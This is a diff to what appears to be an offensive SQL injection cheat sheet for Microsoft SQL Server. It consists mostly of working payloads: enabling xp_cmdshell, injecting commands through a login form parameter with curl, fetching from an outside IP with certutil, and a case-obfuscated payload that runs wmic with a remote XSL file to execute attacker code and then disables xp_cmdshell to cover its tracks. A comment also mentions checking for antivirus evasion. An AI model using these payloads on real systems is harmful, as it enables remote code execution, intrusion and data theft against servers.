@@ -87,6 +87,7 @@ NULL
 #Enable xp_cmdshell
 #If SQLI is present can enable shell then run commands upload files
 #ICMP shell is possible
+#Have to check if past antivirus/WinDefender then POST back success or failure
 #Can also base64 the result
 #try mandros.py (Reverse MSSQL shell)
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -101,6 +102,9 @@ curl site.com/test/verify.asp -d "username=ZAP&password=ZAP&logintype=2;EXEC+Xp_
 
 #Make https requests
 EXEC xp_cmdshell 'certutil -urlcache -f https://x.x.x.x';--
+
+#Create tables and pipe information 
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'xP_cmDshEll', 1;RECONFIGURE WITH OVERRIDE;drop table mojones;create table mojones (out varchar(8000));;insert into mojones (out) execute xp_CmdSheLl 'start wmic process get brief /format:\"http://x.x.x.x:443/wojo.xsl\"';EXEC sp_configure 'xP_cMdShelL', 0;RECONFIGURE WITH OVERRIDE;
 
 
 #mysql
